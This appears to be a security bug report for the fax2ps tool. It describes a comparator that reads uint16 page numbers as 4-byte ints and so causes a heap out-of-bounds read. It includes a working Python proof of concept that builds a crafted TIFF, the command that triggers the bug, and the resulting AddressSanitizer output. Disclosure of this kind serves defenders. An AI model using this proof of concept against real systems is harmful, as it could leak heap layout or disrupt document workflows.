## Bug0: pcompar casts uint16 element pointer to int causing heap-buffer-overflow OOB read

In `pcompar()` in `tools/fax2ps.c` (lines 309-315), the comparator casts each `void*` argument to `const int*` and dereferences it as a 4-byte integer, but the `pages[]` array is allocated with `sizeof(uint16)` = 2 bytes per element, so comparing the last element reads 2 bytes beyond the heap allocation boundary and triggers a heap-buffer-overflow out-of-bounds read.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented fax2ps binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = "poc_input.tif"

def make_tiff():
    BYTE     = 1
    SHORT    = 3
    LONG     = 4
    RATIONAL = 5

    width  = 8
    height = 1
    image_data = b'\xff' * ((width + 7) // 8 * height)  # 1 byte: all black

    # Header: II (little-endian), magic 42, offset of first IFD = 8
    header = struct.pack('<2sHI', b'II', 42, 8)

    num_tags = 11

    # IFD starts at offset 8
    # Each IFD entry: tag(2) type(2) count(4) value_or_offset(4) = 12 bytes
    ifd_size = 2 + num_tags * 12 + 4  # count field + entries + next IFD ptr
    ifd_offset = 8

    # Data area starts after IFD
    data_offset = ifd_offset + ifd_size

    # Rational values (8 bytes each): XRes and YRes
    xres_offset = data_offset
    yres_offset = xres_offset + 8
    image_offset = yres_offset + 8

    def ifd_entry(tag, typ, count, value):
        return struct.pack('<HHII', tag, typ, count, value)

    entries = b''
    entries += ifd_entry(256, SHORT, 1, width)           # ImageWidth
    entries += ifd_entry(257, SHORT, 1, height)          # ImageLength
    entries += ifd_entry(258, SHORT, 1, 1)               # BitsPerSample
    entries += ifd_entry(259, SHORT, 1, 1)               # Compression = None
    entries += ifd_entry(262, SHORT, 1, 0)               # PhotometricInterp = WhiteIsZero
    entries += ifd_entry(273, LONG,  1, image_offset)    # StripOffsets
    entries += ifd_entry(278, SHORT, 1, height)          # RowsPerStrip
    entries += ifd_entry(279, LONG,  1, len(image_data)) # StripByteCounts
    entries += ifd_entry(282, RATIONAL, 1, xres_offset)  # XResolution
    entries += ifd_entry(283, RATIONAL, 1, yres_offset)  # YResolution
    entries += ifd_entry(296, SHORT, 1, 2)               # ResolutionUnit = inch

    ifd = struct.pack('<H', num_tags) + entries + struct.pack('<I', 0)  # next IFD = 0

    # Rational data: numerator=72, denominator=1
    xres_data = struct.pack('<II', 72, 1)
    yres_data = struct.pack('<II', 72, 1)

    tiff = header + ifd + xres_data + yres_data + image_data
    return tiff

tiff_bytes = make_tiff()
with open(OUTPUT, 'wb') as f:
    f.write(tiff_bytes)
print(f"[+] Written {len(tiff_bytes)} bytes to {OUTPUT}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/fax2ps -p 2 -p 1 poc_input.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000032 at pc 0x55c55855ae28 bp 0x7fff1c805900 sp 0x7fff1c8058f0
READ of size 4 at 0x502000000032 thread T0
    #0 0x55c55855ae27 in pcompar fax2ps+0x9e27
    #1 0x7f14eb7288cf in __interceptor_qsort sanitizer_common_interceptors.inc:9899

### Impact

An attacker who supplies a crafted TIFF file and triggers the `-p` flag path causes `fax2ps` to perform a 4-byte read 2 bytes past the end of a heap-allocated `uint16` array, exposing heap allocator metadata such as chunk size and flag fields. This out-of-bounds read can leak internal heap layout information that aids in bypassing ASLR when chained with a write primitive. Additionally, returning incorrect comparison values from `pcompar` corrupts the page ordering and may produce malformed PostScript output, constituting a denial-of-service for workflows that depend on correct page sequencing.
